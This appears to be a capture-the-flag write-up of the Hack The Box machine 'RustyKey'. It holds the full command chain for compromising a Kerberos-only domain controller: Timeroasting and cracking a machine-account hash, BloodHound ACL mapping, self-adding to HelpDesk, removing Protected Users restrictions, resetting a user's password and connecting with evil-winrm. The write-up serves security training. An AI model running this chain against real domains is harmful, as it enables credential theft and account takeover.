## Overview

RustyKey is a hard-difficulty Windows machine built around a Domain Controller with **NTLM disabled** — every authentication is Kerberos, and the domain only offers RC4. The path to user starts with **Timeroasting**: the DC's signed NTP responses leak computer-account password hashes, one of which (`IT-Computer3$`) has a human-chosen password that cracks. From there, BloodHound reveals an ACL chain — that machine account can add itself to `HelpDesk`, which can reset other users' passwords and edit a group nested under `Protected Users`. Resetting `bb.morgan` (a Remote Management user) lands the user flag. This post stops at user.

## Recon

```bash
nmap -p- -sV -sC -Pn 10.129.232.127
```

| 389 / 636 / 3268 / 3269 | LDAP / LDAPS / Global Catalog |

Classic Domain Controller for `rustykey.htb`. The tell that changes everything: SMB reports `NTLM:False` and authenticating with the provided credentials returns `STATUS_NOT_SUPPORTED` — **NTLM is disabled**, so the whole engagement is Kerberos-only.

```bash
echo "10.129.232.127 dc.rustykey.htb rustykey.htb dc" | sudo tee -a /etc/hosts
# every tool below runs over Kerberos; getTGT talks to -dc-ip directly
impacket-getTGT -dc-ip 10.129.232.127 rustykey.htb/'rr.parker':'<redacted>'
```

A UDP sweep shows NTP on `123/udp` — the opening for Timeroasting.

## Enumeration

**Timeroasting.** Windows DCs sign NTP responses with a key derived from a computer account's password, and the request needs no authentication. NetExec's `timeroast` module harvests every machine/trust-account hash, each addressed by its RID:

```bash
nxc smb 10.129.232.127 -M timeroast
```

![timeroast hashes and RID 1125 crack](/assets/Images/rustykey-001_enum_loot-timeroast-1125.png)

Most machine passwords are random and uncrackable — but one isn't. Cracking the `sntp-ms` hashes against `rockyou` (the cracker must read the wordlist as `latin-1`) recovers the password for RID **1125**, and `lookupsid` maps that RID to an account name:

```bash
# requires: SecuraBV Timeroast timecrack.py (open wordlist as encoding='latin-1')
python3 timecrack.py hashes /usr/share/wordlists/rockyou.txt      # RID 1125 -> Rusty88!
impacket-lookupsid -k -no-pass -target-ip 10.129.232.127 dc.rustykey.htb | grep 1125
# 1125: RUSTYKEY\IT-Computer3$
```

We now own a machine account: `IT-Computer3$:Rusty88!`.

**BloodHound.** Collecting with that account over Kerberos exposes the ACL chain:

```bash
bloodhound-python -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -c all -ns 10.129.232.127 -k
```

- `IT-Computer3$` can **add itself** to `HelpDesk` (`AddSelf`).
- `HelpDesk` can **add/remove members** of `Protected Objects` (which is nested inside `Protected Users`).
- `HelpDesk` can **reset the password** (`ForceChangePassword`) of `bb.morgan`, `ee.reed`, and `dd.ali`.
- `bb.morgan` is in **Remote Management Users** → can use WinRM.

## Foothold

The plan: self-add to `HelpDesk`, refresh the ticket so the new membership is in the PAC, reset `bb.morgan`, and WinRM in. One snag — `bb.morgan` is nested under `Protected Users`, which forbids RC4 Kerberos, so a freshly issued TGT fails with `KDC_ERR_ETYPE_NOSUPP`. Because `HelpDesk` can edit `Protected Objects`, removing `bb.morgan`'s group from it lifts the restriction.

> HTB cleanup scripts revert group membership and password changes every minute or two — run the whole chain back-to-back in one window.

```bash
export KRB5CCNAME=IT-Computer3\$.ccache
B="bloodyAD -k --dc-ip 10.129.232.127 --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88!"

# 1. self-add to HelpDesk, then refresh the TGT so the PAC carries the new membership
$B add groupMember 'helpdesk' 'IT-Computer3$'
impacket-getTGT -dc-ip 10.129.232.127 rustykey.htb/'IT-Computer3$':'Rusty88!'

# 2. lift the Protected Users RC4 block, then reset bb.morgan
$B remove groupMember 'Protected Objects' 'IT'
$B set password bb.morgan '<redacted>'

# 3. TGT as bb.morgan
impacket-getTGT -dc-ip 10.129.232.127 rustykey.htb/'bb.morgan':'<redacted>'
```

With the ticket, Evil-WinRM authenticates over Kerberos:

```bash
export KRB5CCNAME=bb.morgan.ccache
evil-winrm -r rustykey.htb -i dc.rustykey.htb
```
